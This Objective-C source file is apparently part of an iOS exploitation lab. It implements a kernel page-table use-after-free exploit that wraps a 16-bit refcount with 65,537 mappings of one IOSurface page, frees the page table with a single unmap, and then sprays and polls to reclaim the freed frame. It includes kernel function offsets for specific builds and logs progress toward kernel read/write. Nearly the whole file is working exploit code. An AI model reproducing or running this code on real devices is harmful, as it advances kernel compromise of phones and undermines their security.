//
//  P084PmapTtePUA.m — pmap-tte-remove PUAF port (see .h)
//  v1: recipe port + full instrumentation. A14 write-through is untested
//  publicly — this tap produces that data point.
//

#import "P084PmapTtePUA.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <fcntl.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <setjmp.h>
#import <signal.h>
#import <mach/mach_init.h>
#import <mach/mach_port.h>
#import <pthread.h>
#import <string.h>
#import <unistd.h>

#define P084_BUILD @"p084-pmap-tte-puaf-v6"

/* P007 convention: local mach_vm prototypes, no <mach/mach_vm.h> */
typedef unsigned long long p084_vmaddr_t;
typedef unsigned long long p084_vmsize_t;
kern_return_t mach_vm_map(vm_map_t target_task, p084_vmaddr_t *address,
                          p084_vmsize_t size, p084_vmsize_t mask, int flags,
                          mem_entry_name_port_t object,
                          memory_object_offset_t offset, boolean_t copy,
                          vm_prot_t cur_protection, vm_prot_t max_protection,
                          vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, p084_vmaddr_t *address,
                               p084_vmsize_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, p084_vmaddr_t address,
                                 p084_vmsize_t size);
kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
                                        memory_object_size_t *size,
                                        memory_object_offset_t offset,
                                        vm_prot_t permission,
                                        mem_entry_name_port_t *object_handle,
                                        mem_entry_name_port_t parent_handle);

#ifndef VM_FLAGS_ANYWHERE
#define VM_FLAGS_ANYWHERE 0x0001
#endif
#ifndef VM_FLAGS_FIXED
#define VM_FLAGS_FIXED 0x0000
#endif
#ifndef VM_FLAGS_OVERWRITE
#define VM_FLAGS_OVERWRITE 0x4000
#endif
#ifndef VM_FLAGS_RETURN_DATA_ADDR
#define VM_FLAGS_RETURN_DATA_ADDR 0x1000000
#endif

/* recipe constants */
#define P084_PAGE        0x4000ULL           /* Apple 16K page */
#define P084_N_MAP       65537               /* wraps uint16 (65536+1) */
#define P084_KEEP        64                  /* mass-mode dangling survivors */
#define P084_VA_TOTAL    (P084_PAGE * P084_N_MAP)   /* ~1.07GB VA */
#define P084_CHUNK       8192                /* unmap batch size (mass mode) */
#define P084_FILL        0x41
#define P084_WATCH_SEC   60                  /* quarantine-release poll */
#define P084_SPRAY       1024                /* C3 new-L3 attempts (v5 was 256) */

/* v6 mode select. Default = SINGLE (v5 live 20:13 evidence: after 65,473
   unmaps the free had NOT fired — C3 hit nothing, so the unmap count must
   be exactly ONE decrement past the wrap: unmap page 65536 once, refcnt
   1->0, 65,536 PTE-live mappings stay behind). Write
   Documents/p084_mode_massunmap.txt to reproduce v5's "unmap all but 64". */

static void *p084_surf = NULL;

typedef void *(*p084_surf_create_t)(CFDictionaryRef);
typedef void *(*p084_surf_getbase_t)(void *);

static NSMutableString *g_log = nil;
static int g_fd = -1;
static volatile int32_t g_gen = 0;

/* volatile zones so the compiler cannot optimize the probe reads/writes */
static uint8_t p084_read8(uint8_t *p) { return *(volatile uint8_t *)p; }
static void p084_write8(uint8_t *p, uint8_t v) { *(volatile uint8_t *)p = v; }

static sigjmp_buf p084_jmp;
static volatile int p084_faulted;
static void p084_segv(int sig) { (void)sig; p084_faulted = 1; siglongjmp(p084_jmp, 1); }
/* Returns 1 and *out on success, 0 if the read faulted (L3 slot zeroed). */
static int p084_safe_u32(volatile void *p, uint32_t *out) {
    p084_faulted = 0;
    if (sigsetjmp(p084_jmp, 1) == 0) {
        *out = *(volatile uint32_t *)p;
        return 1;
    }
    return 0;
}

@implementation P084PmapTtePUA

+ (NSString *)tap {
    /* A new tap retires the previous one. The 60s watcher used to keep
       writing p084_pmap_tte_puaf_log.txt after Unlock + a second tap, and
       its old file offset landed in the middle of the new banner. */
    int32_t mine = __atomic_add_fetch(&g_gen, 1, __ATOMIC_RELAXED);
    if (g_fd >= 0) { close(g_fd); g_fd = -1; }
    g_log = [NSMutableString string];
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    g_fd = open([[docs stringByAppendingPathComponent:@"p084_pmap_tte_puaf_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^L)(NSString *) = ^(NSString *s) {
        if (mine != g_gen || !g_log) return;
        NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
        [g_log appendString:out];
        int fd = g_fd;
        if (fd >= 0 && mine == g_gen) {
            const char *p = out.UTF8String;
            if (p) write(fd, p, strlen(p));
        }
    };

    L([NSString stringWithFormat:@"=== p084 session %@ BUILD %@ ===",
        LabLocalMilitaryNow(), P084_BUILD]);
    L(@"pmap-tte-remove PUAF port (Indegosblade public recipe). uint16 pt_desc");
    L(@"refcount wrap: 65,537 MAP_SHARED maps of ONE 16KB page, then the");
    L(@"recipe's single decrement drives refcount 1->0 (v6 DEFAULT; mass-unmap");
    L(@"v5 variant behind Documents/p084_mode_massunmap.txt).");
    L(@"SPTM note (honest): T8150 is SPTM. T8101/T8020 SPTM status is NOT pinned");
    L(@"in this lab — the 23G71 Ghidra pins below do not paste onto T8101 either way.");
    L(@"23G71 pins: remove 0xa4df188 enter 0xa4e21d8 tte_dealloc 0x9e27f34.");
    L(@"Both A14 23F77 and A12X 23G71 run this tap; no reclaim claim from prose.");
    L(@"PANIC POSSIBLE - one tap per fresh boot.");
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p084"];
    if (stop) {
        L(stop);
        if (mine == g_gen && g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return g_log;
    }
    L([LabDeviceProfile identBlock]);
    L([NSString stringWithFormat:@"BUILD %@ — dual-SKU gate passed (unknown machines only are blocked)", P084_BUILD]);
    BOOL p084_mass = NO;
    {
        /* v6: DEFAULT single-unmap (the recipe). Mass-unmap = v5 reproduction,
           only when Documents/p084_mode_massunmap.txt exists. */
        p084_mass = [[NSFileManager defaultManager] fileExistsAtPath:
            [docs stringByAppendingPathComponent:@"p084_mode_massunmap.txt"]];
        L([NSString stringWithFormat:@"[*] mode: %@",
            p084_mass ? @"MASS-UNMAP (v5 reproduction)" : @"SINGLE-UNMAP (recipe: one decrement past the wrap)"]);
    }
    /* function-scope state shared by C3 / Phase E / VERDICT */
    int spread = p084_mass ? 0 : 2048;
    int p084_reclaimHits = 0;   /* C3 faults+changed, plus any Phase E release */

    /* ---- IOSurface dlopen+dlsym (LightSwordCalib pattern: framework is not
       loaded until something pulls it in — RTLD_DEFAULT alone fails) ---- */
    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    p084_surf_create_t surfCreate = (p084_surf_create_t)dlsym(iosf, "IOSurfaceCreate");
    p084_surf_getbase_t surfBase = (p084_surf_getbase_t)dlsym(iosf, "IOSurfaceGetBaseAddress");
    if (!surfCreate || !surfBase) {
        L(@"[-] IOSurface dlopen/dlsym failed");
        if (mine == g_gen && g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return g_log;
    }
    p084_surf = surfCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAllocSize": @(0x4000),
    });
    void *base = p084_surf ? surfBase(p084_surf) : NULL;
    if (!p084_surf || !base) {
        L(@"[-] IOSurface 16KB alloc failed");
        if (mine == g_gen && g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return g_log;
    }
    memset(base, P084_FILL, 0x4000);
    L(@"[+] IOSurface 16KB created and filled 0x41");

    /* ---- named memory entry over the surface base (LightSwordCalib pattern) ---- */
    memory_object_size_t esz = 0x4000;
    mem_entry_name_port_t entry = 0;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &esz,
        (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
    L([NSString stringWithFormat:@"[*] memory entry kr=0x%x size=0x%llx port=0x%x",
        kr, (unsigned long long)esz, entry]);
    if (kr != KERN_SUCCESS || !entry) {
        L(@"[-] no entry");
        if (mine == g_gen && g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return g_log;
    }

    /* ---- VA reservation: 1.07GB ---- */
    p084_vmaddr_t vaBase = 0;
    kr = mach_vm_allocate(mach_task_self(), &vaBase, P084_VA_TOTAL, VM_FLAGS_ANYWHERE);
    L([NSString stringWithFormat:@"[*] reserve 0x%llx kr=0x%x va=0x%llx",
        (unsigned long long)P084_VA_TOTAL, kr, (unsigned long long)vaBase]);
    if (kr != KERN_SUCCESS) {
        L(@"[-] VA reservation failed (VA budget?) — abort, device NOT crashed");
        mach_port_deallocate(mach_task_self(), entry);
        if (mine == g_gen && g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return g_log;
    }

    /* ---- PHASE A: 65,537 FIXED|OVERWRITE maps of the same page ---- */
    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
    int ok = 0, oom = 0, other = 0, lastOtherKr = 0;
    for (uint32_t i = 0; i < P084_N_MAP; i++) {
        p084_vmaddr_t a = vaBase + (p084_vmaddr_t)i * P084_PAGE;
        kr = mach_vm_map(mach_task_self(), &a, P084_PAGE, 0,
                         VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                         entry, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT,
                         VM_INHERIT_NONE);
        if (kr == KERN_SUCCESS) ok++;
        else if (kr == KERN_NO_SPACE || kr == KERN_RESOURCE_SHORTAGE) oom++;
        else { other++; lastOtherKr = kr; }
        if ((i & 0x1fff) == 0x1fff) {
            L([NSString stringWithFormat:@"  map %u/65537 ok=%d oom=%d other=%d",
                i + 1, ok, oom, other]);
        }
        if (oom > 256) { L(@"[-] VA exhaustion — abort mid-recipe (device alive)"); goto abort; }
    }
    L([NSString stringWithFormat:@"[+] PHASE A maps: ok=%d oom=%d other=%d (lastOtherKr=0x%x) t=%.1fs",
        ok, oom, other, lastOtherKr, CFAbsoluteTimeGetCurrent() - t0]);
    if (ok < P084_N_MAP - 8) {
        L(@"[-] could not reach 65,537 live mappings — refcount wrap needs ALL of them");
        goto abort;
    }

    /* sanity: survivor[0] still shows our fill */
    {
        uint8_t *s0 = (uint8_t *)(uintptr_t)(vaBase);
        BOOL sane = YES;
        for (int k = 0; k < 16; k++) if (p084_read8(s0 + k) != P084_FILL) { sane = NO; break; }
        L([NSString stringWithFormat:@"[*] pre-unmap sanity survivor[0] fill=%@", sane ? @"OK" : @"BAD"]);
    }

    /* ---- PHASE B (v6): drive refcount to EXACTLY 0 with one decrement.
       After 65,537 maps refcount ≡ 1 (mod 65536). Single mode: unmap page
       65536 ONCE → refcnt 0 → pmap_free_pt_delayed, with 65,536 PTE-live
       mappings still resident (the PUAF). Mass mode = v5 reproduction. Panic
       window is HERE. ---- */
    t0 = CFAbsoluteTimeGetCurrent();
    if (!p084_mass) {
        kr = mach_vm_deallocate(mach_task_self(),
            vaBase + (p084_vmaddr_t)(P084_N_MAP - 1) * P084_PAGE, P084_PAGE);
        L([NSString stringWithFormat:@"  single unmap page 65536 kr=0x%x — refcount 1->0", kr]);
        if (kr != KERN_SUCCESS) {
            L(@"[-] single unmap failed — state unknown, device may panic later");
            goto after_unmap;
        }
    } else {
        for (uint32_t start = P084_KEEP; start < P084_N_MAP; start += P084_CHUNK) {
            uint32_t end = start + P084_CHUNK;
            if (end > P084_N_MAP) end = P084_N_MAP;
            kr = mach_vm_deallocate(mach_task_self(),
                                    vaBase + (p084_vmaddr_t)start * P084_PAGE,
                                    (p084_vmaddr_t)(end - start) * P084_PAGE);
            L([NSString stringWithFormat:@"  unmap [%u..%u) kr=0x%x",
                start, end, kr]);
            if (kr != KERN_SUCCESS) {
                L(@"[-] deallocate failed mid-recipe — state unknown, device may panic later");
                goto after_unmap;
            }
        }
        L([NSString stringWithFormat:@"[+] PHASE B mass mode unmapped %u mappings t=%.1fs (v5 reproduction)",
            P084_N_MAP - P084_KEEP, CFAbsoluteTimeGetCurrent() - t0]);
    }
    L([NSString stringWithFormat:@"[+] PHASE B done t=%.1fs", CFAbsoluteTimeGetCurrent() - t0]);

after_unmap: ;
    /* ---- PHASE C: survivor read-back. 0x41 fill = pt page NOT freed.
       Anything else = the underlying physical page changed = PRIMITIVE. ---- */
    {
        uint8_t *s0 = (uint8_t *)(uintptr_t)(vaBase);
        int foreign = 0, stillFill = 0;
        for (int k = 0; k < 0x400; k++) {
            uint8_t v = p084_read8(s0 + k);
            if (v == P084_FILL) stillFill++;
            else foreign++;
        }
        L([NSString stringWithFormat:@"[**] PHASE C survivor[0] first 0x400 bytes: fill=%d foreign=%d",
            stillFill, foreign]);
        if (foreign > 0) {
            L(@"[**] DANGLING PTE LIVE — underlying page no longer our IOSurface fill.");
            L(@"[**] first 64 bytes @survivor[0]:");
            NSMutableString *hx = [NSMutableString string];
            for (int k = 0; k < 64; k++) {
                [hx appendFormat:@"%02x ", p084_read8(s0 + k)];
                if ((k & 15) == 15) { L([NSString stringWithFormat:@"  %04x: %@", k - 15, hx]); [hx setString:@""]; }
            }
        } else {
            /* v3 NOTE: unchanged fill does NOT disprove the free — a freed pt
               page keeps its PTE VALUES, so survivors keep reading our fill
               until the frame is REUSED. The reuse discriminator is below. */
            L(@"[C0] survivor[0] still our fill (expected under both hypotheses — see churn discriminator)");
        }
    }

    /* ---- PHASE C3 (v4): pmap_pages spray. v3 churn (16MB/round) stays
       inside one 32MB L3 window, so it never calls pmap_pages_alloc.
       A12X frees an L3 page onto pmap_pages_free_list, not the user-page
       list. Stamp survivor[0] with 0xDEA1DEAD, then allocate 16KB at
       32MB stride so each touch needs a new L3 page. HIT = fault (slot
       zeroed on recycle) or the stamp replaced. ---- */
    {
        struct sigaction sa, oldSegv, oldBus;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = p084_segv;
        sigaction(SIGSEGV, &sa, &oldSegv);
        sigaction(SIGBUS, &sa, &oldBus);

        volatile uint32_t *mark = (volatile uint32_t *)(uintptr_t)vaBase;
        for (int j = 0; j < (int)(P084_PAGE / 4); j++) mark[j] = 0xDEA1DEADu;
        uint32_t check = 0;
        int markOk = p084_safe_u32((void *)mark, &check) && check == 0xDEA1DEADu;
        L([NSString stringWithFormat:@"[C3] stamp survivor[0] 0xDEA1DEAD readable=%d", markOk]);

        int sprayed = 0, sprayFail = 0;
        kern_return_t firstKr = KERN_SUCCESS;
        /* v4 FIXED at 0x180000000 failed 512/512 (address not reserved).
           v5: mach_vm_map ANYWHERE, 32MB-aligned, so each page starts a new L3. */
        for (int i = 0; i < P084_SPRAY; i++) {
            p084_vmaddr_t a = 0;
            kern_return_t k2 = mach_vm_map(mach_task_self(), &a, P084_PAGE,
                                           0x1FFFFFFULL, VM_FLAGS_ANYWHERE,
                                           MACH_PORT_NULL, 0, FALSE,
                                           VM_PROT_READ | VM_PROT_WRITE,
                                           VM_PROT_READ | VM_PROT_WRITE,
                                           VM_INHERIT_NONE);
            if (k2 != KERN_SUCCESS) {
                if (sprayFail == 0) firstKr = k2;
                sprayFail++;
                continue;
            }
            p084_write8((uint8_t *)(uintptr_t)a, 0xAB);
            sprayed++;
        }
        /* Fallback: 32MB reservation, touch both ends. Lazy VA, two faults. */
        if (sprayed == 0) {
            L([NSString stringWithFormat:@"[C3] aligned map failed firstKr=0x%x — fallback 64 x 32MB touch-both-ends",
                firstKr]);
            for (int i = 0; i < 64; i++) {
                p084_vmaddr_t a = 0;
                kern_return_t k2 = mach_vm_allocate(mach_task_self(), &a,
                                                    0x2000000ULL + P084_PAGE,
                                                    VM_FLAGS_ANYWHERE);
                if (k2 != KERN_SUCCESS) { sprayFail++; continue; }
                p084_write8((uint8_t *)(uintptr_t)a, 0xAB);
                p084_write8((uint8_t *)(uintptr_t)(a + 0x2000000ULL), 0xAB);
                sprayed++;
            }
        }
        L([NSString stringWithFormat:@"[C3] L3 spray ok=%d fail=%d firstKr=0x%x",
            sprayed, sprayFail, firstKr]);

        /* v6: sample spread across ALL L3 tables backing the span — one VA
           per table (every 2048 pages) plus the first 64 VAs. In single mode
           survivors = 65536 mappings across 32 L3 tables, so first-64-only
           would miss a reused table that doesn't back the span start. All
           mappings alias the SAME page, so every healthy survivor reads
           0xDEA1DEAD. */
        int faults = 0, unchanged = 0, changed = 0, probed = 0;
        for (int k = 0; k < P084_KEEP || (spread && k < 65536); k += (k < 64 ? 1 : spread)) {
            uint32_t val = 0;
            void *p = (void *)(uintptr_t)(vaBase + (p084_vmaddr_t)k * P084_PAGE);
            probed++;
            if (!p084_safe_u32(p, &val)) {
                faults++;
                if (faults == 1)
                    L([NSString stringWithFormat:@"[**] survivor %d SIGSEGV — L3 slot zeroed on recycle (HIT)", k]);
            } else if (val == 0xDEA1DEADu) {
                unchanged++;
            } else {
                changed++;
                if (changed <= 4)
                    L([NSString stringWithFormat:@"[**] survivor %d now 0x%08x (was 0xDEA1DEAD)", k, val]);
            }
        }
        L([NSString stringWithFormat:@"[C3] probe n=%d faults=%d unchanged=%d changed=%d",
            probed, faults, unchanged, changed]);
        p084_reclaimHits = faults + changed;
        L([NSString stringWithFormat:@"[C3] probe faults=%d unchanged=%d changed=%d",
            faults, unchanged, changed]);
        if (sprayed == 0) {
            L(@"[-] SPRAY DID NOT RUN — no new L3 page was requested. Not a miss.");
        } else if (faults + changed > 0) {
            L(@"[**] HIT — freed L3 page was recycled by a new page-table allocation.");
            L(@"[**] pmap-tte reclaim is live on this SKU. Not hasKread yet.");
        } else {
            L([NSString stringWithFormat:@"[-] MISS after %d new L3 pages. Page was not freed, or it did not return to pmap_pages_free_list.",
                sprayed]);
        }
        sigaction(SIGSEGV, &oldSegv, NULL);
        sigaction(SIGBUS, &oldBus, NULL);
    }

    /* Stamp above writes 0xDEA1DEAD over the 0x41 fill. That is our store,
       not a reused page. Do not treat it as foreign. */
    L(@"[D] write-through skipped — the C3 stamp is our own store, not evidence");

    /* ---- PHASE E: quarantine-release poll. SPTM quarantine is a DELAYED
       free — if the frame is released and reallocated, survivor bytes change.
       This is the unexplored conversion angle. v6 watches the same spread
       set as C3 (first 64 VAs + one per L3 table in single mode). ---- */
    {
        int watchIdx[128];
        int watchN = 0;
        for (int k = 0; k < P084_KEEP && watchN < 64; k++) watchIdx[watchN++] = k;
        if (spread) for (int k = 64; k < 65536 && watchN < 96; k += spread) watchIdx[watchN++] = k;
        /* spread is function-scope (v6): 0 in mass mode, 2048 in single mode */
        static uint8_t snap[128][16];
        for (int i = 0; i < watchN; i++) {
            uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)watchIdx[i] * P084_PAGE);
            for (int b = 0; b < 16; b++) snap[i][b] = p084_read8(s + b);
        }
        for (int sec = 5; sec <= P084_WATCH_SEC && mine == g_gen; sec += 5) {
            sleep(5);
            int changed = 0;
            NSMutableString *who = [NSMutableString string];
            for (int i = 0; i < watchN; i++) {
                uint8_t *s = (uint8_t *)(uintptr_t)(vaBase + (p084_vmaddr_t)watchIdx[i] * P084_PAGE);
                for (int b = 0; b < 16; b++) {
                    if (p084_read8(s + b) != snap[i][b]) {
                        changed++;
                        [who appendFormat:@"s%d ", watchIdx[i]];
                        break;
                    }
                }
            }
            L([NSString stringWithFormat:@"  watch+%ds changed=%d %@", sec, changed, who]);
            if (changed) {
                L(@"[**] QUARANTINE RELEASE / REALLOC observed — poll-and-claim angle is live");
                p084_reclaimHits += changed;
                break;
            }
        }
    }

    /* ---- [VERDICT] structured line: which rung failed, mechanically. ---- */
    {
        const char *first_fail;
        int fires = 0, ok = 1;
        const char *stage = "b";   /* v6 rung under test = reclaim */
        if (p084_reclaimHits > 0) {
            first_fail = "none";
        } else {
            first_fail = "c0-or-b (free did not fire, or quarantine held past watch)";
            ok = 0;
        }
        fires += 1;   /* the unmap decrement happened (mode line says which) */
        L([NSString stringWithFormat:@"[VERDICT] stage=%s first_fail_stage=%s fires=%d ok=%d reclaim_hits=%d",
            stage, first_fail, fires, ok, p084_reclaimHits]);
        L(@"[VERDICT] semantics: rung-a=wrap fire, rung-b=reclaim, rung-c=PTE identify.");
        L(@"[VERDICT] reclaim_hits=0 => free did not fire OR quarantine held —");
        L(@"[VERDICT] compare the mode line above before drawing conclusions.");
    }

abort:
    L(@"=== HONESTY === PUAF primitive = kernel-adjacent phys R/W via dangling PTEs.");
    L(@"NOT hasKread. commitSlide still gated on kread32(kbase)==MH_MAGIC_64.");
    L(@"If a pt page / kernel object lands in the freed frame, this becomes a");
    L(@"conversion candidate — needs the reclaim-poll data above.");
    if (mine == g_gen && g_fd >= 0) {
        fcntl(g_fd, F_FULLFSYNC);
        close(g_fd);
        g_fd = -1;
    }
    return g_log;
}

@end